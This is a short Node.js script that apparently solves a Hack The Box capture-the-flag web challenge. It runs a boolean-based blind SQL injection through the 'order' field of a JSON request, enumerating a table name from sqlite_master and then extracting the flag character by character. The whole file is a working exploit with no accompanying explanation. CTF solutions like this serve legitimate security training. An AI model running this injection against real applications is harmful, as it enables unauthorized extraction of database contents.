#!/usr/bin/env node

const BASE_URL = `http://${process.argv[2]}`
const CHARS = `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$?@_{}`

const oracle = async payload => {
  const res = await fetch(`${BASE_URL}/api/list`, {
    body: JSON.stringify({ order: `(CASE WHEN ${payload} THEN id ELSE count END)` }),
    headers: { 'Content-Type': 'application/json' },
    method: 'POST',
  })
  const data = await res.json()

  return data[0].id === 1
}

const main = async () => {
  let flagTableName = 'flag_'

  while (flagTableName.length !== 15) {
    for (let c of CHARS) {
      if (await oracle(`(SELECT SUBSTR(tbl_name, ${flagTableName.length + 1}, 1) FROM sqlite_master WHERE tbl_name LIKE 'flag_%') = '${c}'`)) {
        flagTableName += c
        break
      }
    }
  }

  console.log('Flag table name:', flagTableName)

  let flagLength = 1

  while (await oracle(`(SELECT LENGTH(flag) FROM ${flagTableName}) != ${flagLength}`)) {
    flagLength++
  }

  console.log(`Flag length: ${flagLength}`)

  let flag = 'HTB{'

  while (flag.length !== flagLength - 1) {
    for (let c of CHARS) {
      if (await oracle(`(SELECT SUBSTR(flag, ${flag.length + 1}, 1) FROM ${flagTableName}) = '${c}'`)) {
        flag += c
        break
      }
    }
  }

  flag += '}'

  console.log('Flag:', flag)
}

main()
